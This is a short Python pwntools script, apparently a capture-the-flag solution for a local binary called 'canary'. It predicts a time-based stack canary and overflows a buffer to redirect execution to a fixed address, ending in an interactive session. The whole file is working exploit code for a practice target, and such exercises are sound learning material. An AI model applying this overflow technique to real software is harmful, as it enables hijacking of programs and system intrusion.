#! /usr/bin/env python3

from pwn import *
#from os import popen
import subprocess as sp

target = process('./canary')

#gdb.attach(target, gdbscript='b *strtol')

date = sp.getoutput('date +%s')

date = int(date, 10)


log.info(f'canary value => {hex(date)}')



buffer = 0x2c #0x3c - 0x10 to overwrite the check
buffer2 = 0xc #0x3c - (0x2c + 0x4) (+ the check variable thats overwriten)

payload = buffer * b'A'
payload += p32(date)
payload += buffer2 * b'A'
payload += p32(0x08049296)

target.sendline(payload)

target.interactive()

